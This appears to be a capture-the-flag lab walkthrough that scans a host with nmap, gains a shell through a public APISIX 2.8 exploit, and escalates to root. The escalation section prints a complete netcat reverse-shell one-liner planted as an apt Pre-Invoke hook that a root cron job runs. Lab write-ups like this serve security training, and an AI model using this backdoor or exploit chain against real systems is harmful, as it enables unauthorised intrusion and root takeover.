First enumeration with nmap 

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Tue Jan 10 09:53:56 2023 as: nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn 192.168.108.220

now we know what ports are open, let's run default nmap scripts to know what services are running on those ports.

`nmap -sC -sV -oN normal.tcp -p 22,80,3306,43500 -Pn <IP>`

```

cool we got to know what services are running on those ports. let's start enumeration with port 80 (http).

We discover a webserver running on port 80. After opening it in a browser, we are directed to a homepage containing pictures and about. after much playing around, got nothing. let move to the next port 43500 (http).

after opening the it on a browser, i got an error message `{"error_msg":"404 Route Not Found"}` back to the nmap scan result we can see the header of the web service `APISIX/2.8`. let's look for an exploit.

found an exploit on searchsploit `multiple/remote/50829.py` , so what this exploit does it injectes  malicious api keys to the header of the api and spawn a reverse shell for us.

ran the exploit, fired ncat listener.

Boom we are in as user `franklin` stablized the shell.

## Privilege Escalation

running linpeas, i saw cronjobs running as root, and also the `/etc/apt/apt.conf.d` directory is writable, guess that's our way in. who know but let's find out.ðŸ˜‰ 

## Exploiting cronjob

Letâ€™s exploit apt-get service by abusing cron job as we all know cron job run as root. Suppose we had access to the targeted system locally and want the root user rights to enhanced limited shell access.
And we know apt.conf.d file has full permission as said above (You can also manually check to ensure the writable directory using find command) in the lab setup. Therefore, we will create a malicious file inside apt.conf.d by injecting netcat reverse backdoor:

```
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.108 22 >/tmp/f"};' > pwn
```

Start the netcat listener to access the reverse connection of the host machine and wait for 2 minutes to obtain the privilege shell since apt-get update task is scheduled to update the packages every time, after minute through crontab that runs as root and it runs our netcat backdoor pwn to get reverse connections

and we got root!!!ðŸ˜Ž
